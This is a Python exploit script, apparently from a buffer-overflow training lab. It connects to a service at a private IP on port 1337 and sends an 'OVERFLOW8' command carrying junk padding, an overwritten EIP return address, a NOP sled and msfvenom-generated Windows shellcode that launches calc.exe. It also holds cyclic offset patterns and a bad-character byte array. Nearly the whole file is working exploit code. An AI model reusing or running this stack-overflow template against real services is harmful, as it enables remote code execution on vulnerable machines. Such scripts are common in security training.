

import socket


s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
ip = '10.10.204.91'
port = 1337

s.connect((ip,port))

msg = s.recv(2048).decode()
print(msg)
pattern = 'PxQVBDIWEyjNyk6uQxxNpjuX9xm2AZ7Sn5pQiusyyNjQmTNN4gbJxITtltHbn1nyMmaCLYUk1NVFp2kWmzrRxhzTHOiG76aZXJ7aaODIYKiealduyGUOLHQXXjuoSUmLMqGtEuezVXIBMmVruTAxw8jfwfBnp9uZbhn7Rb5Wj0CYFjJ6EOEx5RzXQeJRzp7knkY19NwJDEJfGRFExy70e6jztHhXinstz23WgdjiYpmZl0RLxpPRPCMjIBsl7N3XGiOtigErqE4QP0ukGlRKeZ9yXBhjVvkBE2WpATryLo5WKhHd2jmbrVZ0Xm7xHfuqogtbUgt8qQ0fQGeDQypW1PmbIALFwwv28btHYZW2VU9hsQcqMXD85yAqaFYDKD7NEp70Xvg7XnC3M3vdQo84X6dljUWu0XJ75H2MElIrT8VCPz8i8OgYCgAsb4DrFBDhZNHwcrfvHEliqfAsJefufmtWuxRb6QXhcJaVhbDQPO7TJAtRc9lNXl9GKFP8uKX1quMNPw2eYtZsv0tAdvT4WyLwM9ZsnViIuc6FlpL8Bd1Rmn0tYerIeCdj552Vske0ewyGnkniCVKbaCLSJoB1qcQl8RcgWftyw8LzXT4V4GnMuWL6m7VMUwDSE4gUR8f8n5BQB2HKtcp5OyGD8p91UIhKUO4Wq2Z3370XC2mqgZzWEkw2OcPQ3uAaEOhc7X1YIrAuoLE79FEJf6z0hNFnR5TPA4PqxTKd3jq06QGRedFhgiXiuBfuSPrOYdalvEytjnx78wCKs4rHAs3S3Rn4BiH6y8Egt3v2qWMGS5JPSefIqMCHAkLgrZkTmDeoki05tcblCV1GHh8ytuJHMhtMIrnuiVdoSEZNK6BqUEaNz4oPbBxEmMxAB2oNuZLCxdyBvuagVLTI2KUcCOotuDj1WcSrdfdNAuLm2j2Nj4Sz2AV9YnMxM3dMTgdt4c4p5qGnGaEvv3JVtrknRtQhnRloVW3mr2xQmJJrxi73iNcv'
allbytes = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

pattern = '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'

#01A0FA30   6F457079  ypEo	esp 790
# \x00\x1d\x2e\xc7\xee

junk = 'A'*1786
eip = '\xaf\x11\x50\x62'

esp = '\x90'*32

#  msfvenom -p windows/exec cmd=calc.exe -b "\x00\x1d\x2e\xc7\xee" -f c

esp += ("\xdb\xc5\xba\x0c\x9b\x2a\x5e\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1"
"\x31\x31\x57\x18\x03\x57\x18\x83\xef\xf0\x79\xdf\xa2\xe0\xfc"
"\x20\x5b\xf0\x60\xa8\xbe\xc1\xa0\xce\xcb\x71\x11\x84\x9e\x7d"
"\xda\xc8\x0a\xf6\xae\xc4\x3d\xbf\x05\x33\x73\x40\x35\x07\x12"
"\xc2\x44\x54\xf4\xfb\x86\xa9\xf5\x3c\xfa\x40\xa7\x95\x70\xf6"
"\x58\x92\xcd\xcb\xd3\xe8\xc0\x4b\x07\xb8\xe3\x7a\x96\xb3\xbd"
"\x5c\x18\x10\xb6\xd4\x02\x75\xf3\xaf\xb9\x4d\x8f\x31\x68\x9c"
"\x70\x9d\x55\x11\x83\xdf\x92\x95\x7c\xaa\xea\xe6\x01\xad\x28"
"\x95\xdd\x38\xab\x3d\x95\x9b\x17\xbc\x7a\x7d\xd3\xb2\x37\x09"
"\xbb\xd6\xc6\xde\xb7\xe2\x43\xe1\x17\x63\x17\xc6\xb3\x28\xc3"
"\x67\xe5\x94\xa2\x98\xf5\x77\x1a\x3d\x7d\x95\x4f\x4c\xdc\xf3"
"\x8e\xc2\x5a\xb1\x91\xdc\x64\xe5\xf9\xed\xef\x6a\x7d\xf2\x25"
"\xcf\x71\xb8\x64\x79\x1a\x65\xfd\x38\x47\x96\x2b\x7e\x7e\x15"
"\xde\xfe\x85\x05\xab\xfb\xc2\x81\x47\x71\x5a\x64\x68\x26\x5b"
"\xad\x0b\xa9\xcf\x2d\xe2\x4c\x68\xd7\xfa")

junk2 = 'D'*(3000-len(junk+eip+esp))

payload = 'OVERFLOW8 ' + junk + eip + esp + junk2
payload = payload.encode('raw_unicode_escape')

s.send(payload)

s.close()
